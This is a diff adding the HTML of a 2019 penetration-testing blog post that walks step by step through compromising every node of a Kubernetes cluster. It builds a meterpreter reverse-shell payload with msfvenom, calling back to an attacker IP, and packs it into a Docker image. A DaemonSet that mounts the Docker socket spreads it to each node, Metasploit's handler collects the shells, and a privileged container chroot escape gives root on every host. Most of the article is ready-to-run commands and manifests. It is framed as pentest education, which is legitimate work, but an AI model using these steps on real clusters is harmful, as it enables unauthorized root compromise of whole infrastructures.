@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Making it Rain shells in Kubernetes</title>
+	
+	<meta name="author" content="raesene">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://github.com/raesene">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://twitter.com/raesene">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=35" class="img-circle" />
+				
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories/index.html">Categories</a></li>
+				<li><a href="/tags/index.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories/index.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags/index.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=150" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="/"></a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Security Geek, Penetration Testing, Docker, Ruby, Hillwalking
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/raesene">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/raesene">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rorym">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Making it Rain shells in Kubernetes </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   August 
+	   10th,
+	   
+	   2019
+	 </span>
+	  <div class="article_body">
+	  <p>Following on from the <a href="https://raesene.github.io/blog/2019/08/09/docker-reverse-shells/">last post</a> in this series lets setup a rather more ambitious set of reverse shells when attacking a Kubernetes cluster.</p>
+
+<p>The scenario here is that we’ve got the ability to create a <code class="highlighter-rouge">daemonset</code> object in a target Kubernetes cluster and we’d like to have shells on every node in the cluster which have the Docker socket exposed, so we can get a root shell on every node in the cluster.</p>
+
+<p>To do this we’ll need something that’ll easily handle multiple incoming shells, so we’ll turn to the <a href="https://www.metasploit.com/">Metasploit Framework</a> and specifically, <code class="highlighter-rouge">exploit/multi/handler</code></p>
+
+<h2 id="step-1---create-the-payload">Step 1 - Create the payload</h2>
+
+<p>We need a Docker image that we can deploy to the cluster which will have our payload to connect back to the listener that we’re going to setup and will run on each node in the cluster.</p>
+
+<p>For this we can run msfvenom to setup our payload and then embed that into a Docker image.</p>
+
+<p>In this case our pentester machine will be on <code class="highlighter-rouge">192.168.200.1</code> . To avoid managing all Metasploit’s dependencies we can just run it in a Docker container.</p>
+
+<p>This command will generate our payload</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.200.1 LPORT=8989 -f elf &gt; reverse_shell.elf
+</code></pre></div></div>
+
+<h3 id="setting-up-the-docker-image">Setting up the Docker Image</h3>
+
+<p>Next run this command to get the Docker GPG key into your directory</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://download.docker.com/linux/ubuntu/gpg &gt; docker.gpg
+</code></pre></div></div>
+
+<p>We can now create a Dockerfile to host this shell and upload it to Docker hub.  The Dockerfile is a pretty simple one, we’ll need out payload and also the Docker client, for later use.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM ubuntu:18.04
+
+RUN apt update &amp;&amp; apt install -y apt-transport-https ca-certificates curl software-properties-common
+
+COPY docker.gpg /docker.gpg
+
+RUN apt-key add /docker.gpg
+
+RUN add-apt-repository \
+   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
+   $(lsb_release -cs) \
+   stable"
+
+RUN apt-get install -y docker-ce-cli
+
+COPY reverse_shell.elf /reverse_shell.elf
+
+RUN chmod +x /reverse_shell.elf
+
+CMD ["/reverse_shell.elf"]
+</code></pre></div></div>
+
+<p>Build it with (replace raesene below with your own docker hub name)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker build -t raesene/reverse_shell .
+</code></pre></div></div>
+
+<p>Then you can login to Docker hub with <code class="highlighter-rouge">docker login</code> and upload with</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker push raesene/reverse_shell
+</code></pre></div></div>
+
+<p>At this point we can test our reverse shell on a single machine by setting up a Metasploit listener and check that all is well.</p>
+
+<h3 id="setting-up-metasploit-to-receive-our-shells">Setting up Metasploit to receive our shells</h3>
+
+<p>On the pentester machine start-up the metasploit console with</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+</code></pre></div></div>
+
+<p>then</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+</code></pre></div></div>
+
+<p>and set our variables, in the same way we did with <code class="highlighter-rouge">msfvenom</code> earlier</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set payload linux/x64/meterpreter_reverse_http
+set LHOST 192.168.200.1
+set LPORT 8989
+set ExitOnSession false
+</code></pre></div></div>
+
+<p>With those set, we can start it up to listen for incoming shells</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit -j
+</code></pre></div></div>
+
+<p>Now on a target machine run our shell and we should get that back on the metasploit console</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run raesene/reverse_shell
+</code></pre></div></div>
+
+<p>Assuming that’s all working we’re ready to scale it up to our Kubernetes cluster</p>
+
+<h3 id="using-a-daemonset-to-compromise-a-cluster">Using a Daemonset to compromise a cluster</h3>
+
+<p>So we want a workload which will run on every node in the cluster, and that’s exactly what a daemonset will do for us.  We’ll need a manifest that creates our daemonset and also we want it to expose the Docker socket so we can easily break out of each of our containers to the underlying host.</p>
+
+<p>This should work fine, unless the cluster has a PodSecurityPolicy blocking the mounting of the docker socket inside a container.</p>
+
+<p>We’ll call our manifest <code class="highlighter-rouge">reverse-shell-daemonset.yml</code> and it should contain this :-</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: reverse-shell-daemonset
+  labels:
+spec:
+  selector:
+    matchLabels:
+      name: reverse-shell-daemonset
+  template:
+    metadata:
+      labels:
+        name: reverse-shell-daemonset
+    spec:
+      tolerations:
+      - key: node-role.kubernetes.io/master
+        effect: NoSchedule
+      containers:
+      - name: revshell
+        image: raesene/reverse-shell
+        volumeMounts:
+        - mountPath: /var/run/docker.sock
+          name: dockersock
+      volumes:
+      - name: dockersock
+        hostPath:
+          path: /var/run/docker.sock
+</code></pre></div></div>
+
+<p>Once you’ve got your manifest ready, just apply it to the cluster with</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create -f reverse-shell-daemonset.yml
+</code></pre></div></div>
+
+<p>Back on your metasploit console you should see your shells pop in, one for each node :)</p>
+
+<h3 id="getting-to-root-on-the-nodes">Getting to root on the nodes</h3>
+
+<p>So once you’ve got your shells working, you can interact with them from the Metasploit console</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions -l 
+</code></pre></div></div>
+
+<p>Will show you your active sessions.  Then</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions -i 1
+</code></pre></div></div>
+
+<p>Will let you interact with one of them</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+
+<p>should give you a shell inside the container running on one of our nodes. Now the last part is to use the exposed Docker Socket to get a root shell on the underlying host.</p>
+
+<p>To Do this we can juse make use of the every handy <a href="https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/">Most Pointless Docker Command Ever</a></p>
+
+<p>Running</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
+</code></pre></div></div>
+
+<p>and it’ll dump us out to a root shell on the underlying node :)</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories/index.html#Kubernetes-ref">
+					Kubernetes <span>(11)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/share?text=Making it Rain shells in Kubernetes&via=raesene"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036" class="img-rounded author-image" />
+        <h4 class="section-title author-name">raesene</h4>
+        <p class="author-bio">Security Geek, Penetration Testing, Docker, Ruby, Hillwalking</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/blog/2019/08/09/docker-reverse-shells/" title="Docker and Kubernetes Reverse shells">&larr; Previous</a></li>
+		  
+		  
+			<li class="next disabled"><a>Next &rarr;</a>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2019 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
